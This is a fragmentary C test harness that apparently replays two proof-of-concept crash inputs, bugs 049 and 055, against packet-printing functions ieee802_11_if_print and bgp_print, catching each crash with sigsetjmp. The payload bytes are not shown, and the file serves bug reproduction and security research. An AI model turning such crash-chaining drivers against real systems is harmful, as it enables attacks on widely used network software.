/*
 * Runtime chain: bug 049 (ieee802_11_if_print) -> bug 055 (bgp_print).
 * PoCs from SAILOR replay_driver.c for 049 and 055.
 */
...
int main(void) {
    ...
    if (sigsetjmp(jump_buffer, 1) == 0) {
        printf("[049 -> 055] Stage 1: ieee802_11_if_print\n");
    ...
    unsigned char *buf = malloc(P_DATA_055_LEN);
    memcpy(buf, p_data_055, P_DATA_055_LEN);
    ndo2->ndo_vflag = 1;
    ndo2->ndo_snapend = buf + P_DATA_055_LEN;

    if (sigsetjmp(jump_buffer, 1) == 0) {
        printf("[049 -> 055] Stage 2: bgp_print\n");
        bgp_print(ndo2, buf, P_DATA_055_LEN);
    }
